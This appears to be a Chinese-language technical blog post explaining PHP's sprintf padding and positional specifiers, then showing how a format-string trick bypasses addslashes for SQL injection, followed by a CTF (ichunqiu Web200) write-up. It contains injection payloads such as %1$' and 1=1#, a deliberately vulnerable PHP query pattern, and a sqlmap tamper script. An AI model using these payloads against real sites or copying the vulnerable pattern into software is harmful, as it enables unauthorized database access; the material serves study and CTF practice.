# php中sprintf的使用方法
查阅[官方文档](http://php.net/manual/zh/function.sprintf.php)如果熟悉c语言的printf对sprintf的用法也不会很陌生。
```php
<?php
$num = 5;
$location = 'tree';
$format = 'There are %d monkeys in the %s';
echo sprintf($format, $num, $location);
?>
```
用`%`表示一个打印位置，后面用一些控制符来规定输出格式，我们重点关注这一条性质。
> 3. An optional padding specifier that says what character will be used for padding the results to the right string size. This may be a space character or a 0 (zero character). The default is to pad with spaces. An alternate padding character can be specified by prefixing it with a single quote ('). See the examples below.

大体意思是说我们可以指定宽度打印一个东西，如果需要的宽度比需要打印的东西多，那么我们就需要进行填充，默认以空格填充，或者以0填充，也可以用指定的字符填充，制定的字符前面要加上`'`，例子如下:
```php
<?php
$s = 'monkey';
$t = 'many monkeys';

printf("[%s]\n",      $s); // standard string output
printf("[%10s]\n",    $s); // right-justification with spaces
printf("[%-10s]\n",   $s); // left-justification with spaces
printf("[%010s]\n",   $s); // zero-padding works on strings too
printf("[%'#10s]\n",  $s); // use the custom padding character '#'
printf("[%10.10s]\n", $t); // left-justification but with a cutoff of 10 characters
?>
```
输出如下:
```
[monkey]
[    monkey]
[monkey    ]
[0000monkey]
[####monkey]
[many monke]
```
在第5行我们可以看到，我们使用了#作为填充符，`'`被识别为参数最终没有出现在最终的结果中，在条件适合的时候我们可以用格式化字符串的这个特性逃逸引号进行sql注入。
*****
同时我们关注另一个特性，如果我们想用另外的顺序映射对应格式化点和参数我们可以使用以下的方法：
```php
<?php
$format = 'The %2$s contains %1$d monkeys.
           That\'s a nice %2$s full of %1$d monkeys.';
echo sprintf($format, $num, $location);
?>
```
并且如果`%`后面跟了其他符号，会被直接无视。
# 通过格式化字符串绕过addslashes
如果我们能在格式化字符串中拼接`%‘ or 1=1#`，进入服务器后addslashes结果变成`%\' or 1=1#`，再拼接入待格式化的sql语句：
```sql
SELECT username, password FROM users where username='%\' or 1=1#'
```
因为`%\`不是任何一种输出类型，格式化后得到：
```sql
SELECT username, password FROM users where username='' or 1=1#'
```
成功逃逸
但是可能会出现php报错：`PHP Warning:  sprintf(): Too few arguments`
可以使用这样的payload:`%1$'`不会引起相关报错
### 利用条件
```php
$username = addslashes($_POST['username']);
$password = addslashes($_POST['password']);
$format = "SELECT * FROM user WHERE username='$username' and password=''%s';";
$sql = sprintf($format, $password);
```
总之就是要用户输入待格式化字符串的内容，并且输入或被addslashes
//真的蠢
### 相关tamper
```python
#!/usr/bin/env python
"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces quote character (') with a multi-byte combo %251%24%27 together with
    generic comment at the end (to make it work)

    Notes:
        * Useful for bypassing magic_quotes/addslashes feature

    >>> tamper("1' AND 1=1")
    '1%251%24%27-- '
    """

    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in xrange(len(payload)):
            if payload[i] == '\'' and not found:
                retVal += "%251%24%27"
                found = True
            else:
                retVal += payload[i]
                continue

        if found:
            _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
            if _ != retVal:
                retVal = _
                retVal += "-- "
            elif not any(_ in retVal for _ in ('#', '--', '/*')):
                retVal += "-- "
    return retVal
```
# ichunqiu Web200 SQLI WriteUp
又是开局一个登录页，做法全靠猜。扫个目录，没东西。
随便试几个用户名密码，发现用户名为admin的时候，回显`password error`，其他用户名显示`username error`，再传个数组进去试一下，发现addslashes报错，说明是使用了addslashes函数的，自然想到宽字节注入但是并没有什么卵用。
于是放到burpsuite的intruder里跑一跑waf字典，发现%符号会导致sprintf报错，于是确定是sprintf格式化字符串漏洞绕过单引号。
构造payload`username=admin%1$' and 1=1#&password=1`
和`username=admin%1$' and 1=0#&password=1`
发现存在布尔盲注注入点，所以可以自己写脚本或者用用sqlmap挂tamper做，需要注意的是sqlmap需要开到level 3及以上，并且如果dump出现错误，可以指定technique，用`--technique=B`实现。